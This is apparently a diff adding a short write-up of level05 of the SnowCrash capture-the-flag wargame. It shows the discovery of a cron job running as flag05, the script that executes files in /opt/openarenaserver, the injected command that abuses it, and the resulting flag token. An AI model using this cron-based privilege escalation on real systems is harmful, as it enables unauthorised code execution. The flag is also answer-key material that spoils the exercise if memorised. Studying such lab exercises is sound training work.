@@ -1,1 +1,15 @@
 /var/mail/
+level05@SnowCrash:~$ cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+level05@SnowCrash:/var/mail$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i") // execute script 
+	rm -f "$i"
+done
+
+level05@SnowCrash:~$ echo 'getflag > /var/tmp/test' >> /opt/openarenaserver/toto
+
+viuaaale9huek52boumoomioc
